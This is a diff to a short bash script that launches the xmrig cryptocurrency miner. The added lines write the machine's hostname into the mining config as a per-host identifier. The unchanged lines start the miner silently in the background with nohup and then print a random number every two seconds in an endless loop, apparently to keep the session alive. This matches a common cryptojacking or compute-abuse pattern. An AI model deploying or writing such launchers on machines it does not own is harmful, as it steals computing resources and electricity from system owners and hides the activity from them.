@@ -1,5 +1,8 @@
 #!/bin/bash
 
+PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+echo $PASS
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' ./config.json
 chmod +x xmrig  >/dev/null 2>&1
 nohup ./xmrig --config=config.json &
 while :; do shuf -n 1 -i 1-99999999; sleep 2; done
